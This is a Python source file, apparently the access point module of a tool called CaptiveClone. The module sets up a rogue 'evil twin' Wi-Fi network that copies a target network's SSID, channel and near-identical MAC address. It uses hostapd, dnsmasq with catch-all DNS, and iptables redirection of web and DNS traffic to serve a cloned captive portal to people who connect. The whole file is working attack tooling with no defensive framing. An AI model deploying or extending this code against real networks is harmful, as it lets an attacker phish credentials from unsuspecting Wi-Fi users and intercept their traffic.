"""
Access Point module for CaptiveClone.

This module is responsible for creating and managing a rogue access point
that serves cloned captive portals.
"""

import logging
import os
import subprocess
import time
import threading
import socket
import shutil
import tempfile
import re
from typing import Optional, Dict, List, Any, Tuple

from captiveclone.utils.exceptions import APError, ConfigError
from captiveclone.hardware.adapter import WirelessAdapter
from captiveclone.core.models import WirelessNetwork, CaptivePortal

logger = logging.getLogger(__name__)

# Templates for configuration files
HOSTAPD_CONF_TEMPLATE = """
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
"""

HOSTAPD_CONF_TEMPLATE_HIDDEN = """
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
ignore_broadcast_ssid=1
auth_algs=1
"""

DNSMASQ_CONF_TEMPLATE = """
interface={interface}
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
log-dhcp
listen-address={gateway}
address=/#/{gateway}
"""

class AccessPoint:
    """
    Creates and manages a rogue access point that mimics a target network.
    """
    
    def __init__(self, interface: str, portal_dir: str):
        """
        Initialize the access point.
        
        Args:
            interface: Name of the wireless interface to use for the AP
            portal_dir: Directory containing the portal files to serve
            
        Raises:
            APError: If the interface is not valid or doesn't support AP mode
        """
        self.interface = interface
        self.portal_dir = portal_dir
        self.adapter = None
        self.original_mac = None
        self.spoofed_mac = None
        
        # Configuration for networking
        self.ip_range = "192.168.87.0/24"
        self.gateway = "192.168.87.1"
        self.dhcp_start = "192.168.87.100"
        self.dhcp_end = "192.168.87.200"
        
        # Process management
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.webserver_proc = None
        self.running = False
        self.stop_event = threading.Event()
        
        # Configuration directories
        self.temp_dir = None
        self.hostapd_conf = None
        self.dnsmasq_conf = None
        
        self._validate_and_setup()
    
    def _validate_and_setup(self):
        """
        Validate the interface and set up the adapter.
        
        Raises:
            APError: If requirements aren't met
        """
        # Check if user is root
        if os.geteuid() != 0:
            raise APError("Access point creation requires root privileges")
        
        # Check for required system tools
        for tool in ["hostapd", "dnsmasq", "iptables"]:
            if not shutil.which(tool):
                raise APError(f"Required tool '{tool}' not found. Please install it.")
        
        # Validate interface
        self.adapter = WirelessAdapter(self.interface)
        
        # Create temp directory for configuration files
        self.temp_dir = tempfile.mkdtemp(prefix="captiveclone_")
        self.hostapd_conf = os.path.join(self.temp_dir, "hostapd.conf")
        self.dnsmasq_conf = os.path.join(self.temp_dir, "dnsmasq.conf")
        
        logger.debug(f"Created temp directory for AP configuration: {self.temp_dir}")
    
    def start(self, target_network: WirelessNetwork, hidden: bool = False) -> bool:
        """
        Start the access point, mimicking the target network.
        
        Args:
            target_network: The network to mimic
            hidden: Whether to create a hidden network
            
        Returns:
            True if the AP was started successfully, False otherwise
        """
        if self.running:
            logger.warning("Access point is already running")
            return False
        
        try:
            # Set up the network interface
            self._configure_interface()
            
            # Create configuration files
            self._create_hostapd_conf(target_network, hidden)
            self._create_dnsmasq_conf()
            
            # Start services
            self._start_hostapd()
            self._start_dnsmasq()
            self._configure_iptables()
            self._start_web_server()
            
            self.running = True
            logger.info(f"Access point '{target_network.ssid}' started on channel {target_network.channel}")
            
            # Start monitoring thread
            self.stop_event.clear()
            threading.Thread(target=self._monitor_processes, daemon=True).start()
            
            return True
        
        except Exception as e:
            logger.error(f"Failed to start access point: {str(e)}")
            self.stop()
            raise APError(f"Failed to start access point: {str(e)}")
    
    def stop(self) -> bool:
        """
        Stop the access point and clean up resources.
        
        Returns:
            True if the AP was stopped successfully, False otherwise
        """
        if not self.running:
            logger.debug("Access point is not running")
            return True
        
        self.stop_event.set()
        
        try:
            # Stop services in reverse order
            self._stop_web_server()
            self._stop_dnsmasq()
            self._stop_hostapd()
            self._restore_iptables()
            self._restore_interface()
            
            # Clean up temp files
            if self.temp_dir and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                self.temp_dir = None
            
            self.running = False
            logger.info("Access point stopped")
            
            return True
        
        except Exception as e:
            logger.error(f"Error stopping access point: {str(e)}")
            return False
    
    def _configure_interface(self) -> None:
        """
        Configure the network interface for AP mode.
        """
        # Kill processes that might interfere
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Reset interface to managed mode
        self.adapter.set_monitor_mode(False)
        
        # Configure IP address
        subprocess.run(["ifconfig", self.interface, "down"], check=True)
        subprocess.run(["ifconfig", self.interface, self.gateway, "netmask", "255.255.255.0", "up"], check=True)
        
        logger.debug(f"Configured interface {self.interface} with IP {self.gateway}")
    
    def _create_hostapd_conf(self, network: WirelessNetwork, hidden: bool) -> None:
        """
        Create hostapd configuration file.
        
        Args:
            network: The network to mimic
            hidden: Whether to create a hidden network
        """
        template = HOSTAPD_CONF_TEMPLATE_HIDDEN if hidden else HOSTAPD_CONF_TEMPLATE
        config = template.format(
            interface=self.interface,
            ssid=network.ssid,
            channel=network.channel or 1  # Default to channel 1 if not specified
        )
        
        # Write to file
        with open(self.hostapd_conf, 'w') as f:
            f.write(config)
        
        logger.debug(f"Created hostapd configuration for SSID '{network.ssid}' on channel {network.channel or 1}")
    
    def _create_dnsmasq_conf(self) -> None:
        """
        Create dnsmasq configuration file for DHCP and DNS.
        """
        config = DNSMASQ_CONF_TEMPLATE.format(
            interface=self.interface,
            dhcp_start=self.dhcp_start,
            dhcp_end=self.dhcp_end,
            gateway=self.gateway
        )
        
        # Write to file
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config)
        
        logger.debug(f"Created dnsmasq configuration with DHCP range {self.dhcp_start}-{self.dhcp_end}")
    
    def _start_hostapd(self) -> None:
        """
        Start the hostapd service.
        
        Raises:
            APError: If hostapd fails to start
        """
        # Stop any running instances
        subprocess.run(["pkill", "-f", "hostapd"], stderr=subprocess.PIPE)
        time.sleep(1)
        
        # Start hostapd
        self.hostapd_proc = subprocess.Popen(
            ["hostapd", self.hostapd_conf],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Check if hostapd started successfully
        time.sleep(2)
        if self.hostapd_proc.poll() is not None:
            stderr = self.hostapd_proc.stderr.read().decode('utf-8')
            raise APError(f"Failed to start hostapd: {stderr}")
        
        logger.debug("Started hostapd service")
    
    def _start_dnsmasq(self) -> None:
        """
        Start the dnsmasq service.
        
        Raises:
            APError: If dnsmasq fails to start
        """
        # Stop any running instances
        subprocess.run(["pkill", "-f", "dnsmasq"], stderr=subprocess.PIPE)
        time.sleep(1)
        
        # Start dnsmasq
        self.dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", self.dnsmasq_conf, "-d"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Check if dnsmasq started successfully
        time.sleep(2)
        if self.dnsmasq_proc.poll() is not None:
            stderr = self.dnsmasq_proc.stderr.read().decode('utf-8')
            raise APError(f"Failed to start dnsmasq: {stderr}")
        
        logger.debug("Started dnsmasq service")
    
    def _configure_iptables(self) -> None:
        """
        Configure iptables for traffic routing.
        """
        # Flush existing rules
        subprocess.run(["iptables", "-F"])
        subprocess.run(["iptables", "-t", "nat", "-F"])
        
        # Enable IP forwarding
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        
        # Set up NAT
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
            "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{self.gateway}:80"
        ])
        
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
            "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", f"{self.gateway}:443"
        ])
        
        # Redirect DNS queries
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
            "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", f"{self.gateway}:53"
        ])
        
        logger.debug("Configured iptables for traffic redirection")
    
    def _start_web_server(self) -> None:
        """
        Start a web server to serve the cloned portal.
        """
        # Use Python's built-in HTTP server
        os.chdir(self.portal_dir)
        self.webserver_proc = subprocess.Popen(
            ["python", "-m", "http.server", "80"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for web server to start
        time.sleep(1)
        if self.webserver_proc.poll() is not None:
            stderr = self.webserver_proc.stderr.read().decode('utf-8')
            raise APError(f"Failed to start web server: {stderr}")
        
        logger.debug(f"Started web server on port 80 serving content from {self.portal_dir}")
    
    def _stop_hostapd(self) -> None:
        """Stop the hostapd service."""
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
            self.hostapd_proc.wait(timeout=5)
            self.hostapd_proc = None
        subprocess.run(["pkill", "-f", "hostapd"], stderr=subprocess.PIPE)
    
    def _stop_dnsmasq(self) -> None:
        """Stop the dnsmasq service."""
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
            self.dnsmasq_proc.wait(timeout=5)
            self.dnsmasq_proc = None
        subprocess.run(["pkill", "-f", "dnsmasq"], stderr=subprocess.PIPE)
    
    def _stop_web_server(self) -> None:
        """Stop the web server."""
        if self.webserver_proc:
            self.webserver_proc.terminate()
            self.webserver_proc.wait(timeout=5)
            self.webserver_proc = None
    
    def _restore_iptables(self) -> None:
        """Restore iptables configuration."""
        subprocess.run(["iptables", "-F"])
        subprocess.run(["iptables", "-t", "nat", "-F"])
        
        # Disable IP forwarding
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
    
    def _restore_interface(self) -> None:
        """
        Restore the interface to its original state.
        """
        try:
            # Restore MAC address if needed
            if self.spoofed_mac:
                self._restore_mac_address()
            
            # Reset interface configuration
            subprocess.run(["ifconfig", self.interface, "0.0.0.0"], check=True)
            subprocess.run(["ifconfig", self.interface, "up"], check=True)
            
            logger.debug(f"Interface {self.interface} restored to original state")
        except subprocess.SubprocessError as e:
            logger.error(f"Error restoring interface: {str(e)}")
    
    def _monitor_processes(self) -> None:
        """
        Monitor the running processes and restart them if they crash.
        """
        while not self.stop_event.is_set():
            try:
                if self.hostapd_proc and self.hostapd_proc.poll() is not None:
                    logger.warning("hostapd process died, restarting...")
                    self._start_hostapd()
                
                if self.dnsmasq_proc and self.dnsmasq_proc.poll() is not None:
                    logger.warning("dnsmasq process died, restarting...")
                    self._start_dnsmasq()
                
                if self.webserver_proc and self.webserver_proc.poll() is not None:
                    logger.warning("Web server process died, restarting...")
                    self._start_web_server()
                
                time.sleep(5)
            except Exception as e:
                logger.error(f"Error in process monitoring: {str(e)}")
                time.sleep(10)
    
    def set_mac_address(self, mac_address: str) -> bool:
        """
        Set the MAC address of the interface to spoof a target AP.
        
        Args:
            mac_address: The MAC address to set
            
        Returns:
            True if successful, False otherwise
        """
        # Validate MAC address format
        if not self._is_valid_mac(mac_address):
            logger.error(f"Invalid MAC address format: {mac_address}")
            return False
        
        # Generate a MAC that is close but not identical to the target
        # This maintains the vendor prefix but changes the device ID
        vendor_prefix = mac_address.split(":")[:3]
        device_id = [format(int(x, 16) ^ 2, '02x') for x in mac_address.split(":")[3:]]
        spoofed_mac = ":".join(vendor_prefix + device_id)
        
        try:
            # Store original MAC for restoration
            if not self.original_mac:
                result = subprocess.run(["macchanger", "-s", self.interface], 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      text=True)
                mac_output = result.stdout
                match = re.search(r"Current MAC:\s+([0-9a-fA-F:]{17})", mac_output)
                if match:
                    self.original_mac = match.group(1)
                    logger.debug(f"Stored original MAC: {self.original_mac}")
                else:
                    logger.warning("Could not determine original MAC address")
                    self.original_mac = "00:00:00:00:00:00"  # Placeholder
            
            # Set interface down
            subprocess.run(["ifconfig", self.interface, "down"], check=True)
            
            # Change MAC address
            subprocess.run(["macchanger", "--mac", spoofed_mac, self.interface], check=True)
            
            # Set interface up
            subprocess.run(["ifconfig", self.interface, "up"], check=True)
            
            self.spoofed_mac = spoofed_mac
            logger.info(f"MAC address changed to {spoofed_mac}")
            return True
            
        except subprocess.SubprocessError as e:
            logger.error(f"Failed to change MAC address: {str(e)}")
            return False
    
    def _is_valid_mac(self, mac_address: str) -> bool:
        """
        Validate MAC address format.
        
        Args:
            mac_address: MAC address to validate
            
        Returns:
            True if valid, False otherwise
        """
        pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
        return bool(re.match(pattern, mac_address))

    def _restore_mac_address(self) -> bool:
        """
        Restore the original MAC address of the interface.
        
        Returns:
            True if successful, False otherwise
        """
        if not self.original_mac or not self.spoofed_mac:
            logger.debug("No MAC address to restore")
            return True
        
        try:
            # Set interface down
            subprocess.run(["ifconfig", self.interface, "down"], check=True)
            
            # Restore original MAC
            subprocess.run(["macchanger", "--mac", self.original_mac, self.interface], check=True)
            
            # Set interface up
            subprocess.run(["ifconfig", self.interface, "up"], check=True)
            
            logger.info(f"Restored original MAC address: {self.original_mac}")
            self.spoofed_mac = None
            return True
            
        except subprocess.SubprocessError as e:
            logger.error(f"Failed to restore MAC address: {str(e)}")
            return False
    
    def __del__(self):
        """Clean up resources on deletion."""
        self.stop() 